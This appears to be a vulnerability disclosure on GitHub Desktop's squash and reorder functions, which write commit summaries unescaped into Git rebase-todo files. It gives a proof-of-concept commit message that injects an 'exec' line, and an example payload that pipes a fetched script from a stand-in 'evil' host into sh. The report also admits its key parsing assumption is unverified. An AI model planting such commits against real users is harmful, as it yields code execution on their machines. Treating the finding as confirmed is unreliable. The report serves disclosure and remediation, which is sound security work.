Based on the investigation, the file-level SQL-injection analog is a **line-injection into the interactive-rebase todo file** used by `squash` and `reorder`, where attacker-controlled commit summary text is written unescaped into a structured control file that Git then executes as a script.

### Title
Git rebase-todo command injection via unsanitized commit summary in squash/reorder - (File: app/src/lib/git/squash.ts, app/src/lib/git/reorder.ts)

### Summary
`squash()` and `reorder()` build a Git "rebase-todo" file by directly concatenating `commit.sha` and `commit.summary` into lines such as `pick ${commit.sha} ${commit.summary}\n` and `squash ${commit.sha} ${commit.summary}\n`, then feed that file to `rebaseInteractive()`, which runs `git rebase -i` with `sequence.editor=cat "<todoPath>" >` so Git treats the file's lines as rebase-todo instructions. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`commit.summary` comes from the subject line of an arbitrary commit fetched from a remote repository (fully attacker-controlled if the user clones/fetches a malicious repo). This value is inserted as a raw string into a Git rebase-todo line without checking for embedded newline characters. The rebase-todo file format is line-oriented and treats a line starting with `exec`, `pick`, `break`, etc. as a distinct instruction; the `pick <sha> <summary>` line only "works" safely if `<summary>` cannot itself contain a `\n`. Desktop's related ref-name sanitizer (`sanitizedRefName`) explicitly strips control/newline characters for branch names, showing the project is aware such characters are dangerous in Git-consumed text, [4](#0-3)  but no equivalent sanitization is applied to `commit.summary` before it's written into the rebase-todo control file in `squash.ts`/`reorder.ts`.

If a commit message's first paragraph contains a raw `\n` (i.e., the message has no blank-line separator between "subject" and remaining text, so the summary/body split doesn't isolate a single line), that embedded newline is preserved verbatim in `commit.summary`. When such a commit is squashed or reordered, the appended line effectively becomes two rebase-todo lines from Git's perspective — the intended `pick <sha> ...` line and an attacker-injected line, e.g. `exec calc.exe` or `exec sh -c 'curl evil | sh'`. Since `git rebase -i` executes any `exec` line in the todo file as a shell command in the repository's working directory, this converts a "SQL keyword injection into a query" primitive into a "Git rebase-todo keyword injection into a script", exactly mirroring the report's core vulnerability class: unsanitized attacker input reaching an interpreter that treats special characters (there: SQL metacharacters; here: newline plus todo verbs) as control syntax rather than data.

### Impact Explanation
Successful exploitation results in arbitrary command execution on the victim's machine merely by having them perform a routine, expected GitHub Desktop action (squash or reorder commits) on a repository that contains a maliciously crafted commit — something the attacker fully controls by contributing a commit (e.g., via a pull request branch that gets fetched, or a public repo the user clones). This satisfies the "attacker controls a cloned/fetched repository... resulting in code execution" impact category from the program scope.

### Likelihood Explanation
Requires: (1) the victim to fetch/clone a repository containing the malicious commit, and (2) the victim to squash or reorder commits including that one — both are ordinary Desktop workflows, not privileged or unusual. No warning or confirmation step inspects commit summaries for embedded control characters before writing the rebase-todo file, so likelihood is moderate-to-high assuming the commit-summary parsing does not already strip internal newlines (this specific detail — the exact `summary`/`body` split logic in Desktop's commit model — could not be fully re-verified in this session due to tool-call limits and should be confirmed against `app/src/models/commit.ts` / `app/src/lib/git/log.ts` before treating this as a confirmed exploit).

### Recommendation
Sanitize `commit.summary` (and any other attacker-controlled text) before writing it into rebase-todo files: strip or reject embedded `\n`/`\r` characters, mirroring the existing `sanitizedRefName` approach used for branch names, in `app/src/lib/git/squash.ts` and `app/src/lib/git/reorder.ts` prior to the `appendFile` calls.

### Proof of Concept
1. Attacker pushes a commit whose message has no blank line separating subject and body, e.g. raw commit message bytes: `legit-looking title\nexec touch /tmp/pwned\n\n` (no `\n\n` before `exec ...`, so the "summary" derived by Desktop's split-on-blank-line logic includes the embedded newline and the `exec` line).
2. Victim clones/fetches this repository in GitHub Desktop.
3. Victim selects that commit plus another and chooses "Squash" (or "Reorder").
4. `squash()`/`reorder()` writes `pick <sha> legit-looking title\nexec touch /tmp/pwned\n` into the rebase-todo file. [5](#0-4) 
5. `rebaseInteractive()` invokes `git -c sequence.editor=cat "<todoPath>" > rebase -i <ref>`, causing Git to parse the injected `exec touch /tmp/pwned` line as a real rebase-todo instruction and execute it via the shell during the rebase. [6](#0-5)

### Citations

**File:** app/src/lib/git/squash.ts (L80-81)
```typescript
          await appendFile(todoPath, `squash ${commit.sha} ${commit.summary}\n`)
        } else {
```

**File:** app/src/lib/git/squash.ts (L99-104)
```typescript
          const action = j === 0 ? 'pick' : 'squash'
          await appendFile(
            todoPath,
            `${action} ${toReplayAtSquash[j].sha} ${toReplayAtSquash[j].summary}\n`
          )
        }
```

**File:** app/src/lib/git/reorder.ts (L70-70)
```typescript
          await appendFile(todoPath, `pick ${commit.sha} ${commit.summary}\n`)
```

**File:** app/src/lib/git/rebase.ts (L607-624)
```typescript
  /* If the commit is the first commit in the branch, we cannot reference it
  using the sha thus if lastRetainedCommitRef is null (we couldn't define it),
  we must use the --root flag */
  const ref = lastRetainedCommitRef == null ? '--root' : lastRetainedCommitRef
  const result = await git(
    [
      '-c',
      // This replaces interactive todo with contents of file at pathOfGeneratedTodo
      `sequence.editor=cat "${pathOfGeneratedTodo}" >`,
      'rebase',
      ...(opts?.noVerify ? ['--no-verify'] : []),
      '-i',
      ref,
    ],
    repository.path,
    opts?.action ?? 'Interactive rebase',
    options
  )
```

**File:** app/src/lib/sanitize-ref-name.ts (L1-11)
```typescript
// See https://www.kernel.org/pub/software/scm/git/docs/git-check-ref-format.html
// ASCII Control chars and space, DEL, ~ ^ : ? * [ \
// | " < and > is technically a valid refname but not on Windows
// the magic sequence @{, consecutive dots, leading and trailing dot, ref ending in .lock
const invalidCharacterRegex =
  /[\x00-\x20\x7F~^:?*\[\\|""<>]+|@{|\.\.+|^\.|\.$|\.lock$|\/$/g

/** Sanitize a proposed reference name by replacing illegal characters. */
export function sanitizedRefName(name: string): string {
  return name.replace(invalidCharacterRegex, '-').replace(/^[-\+]*/g, '')
}
```
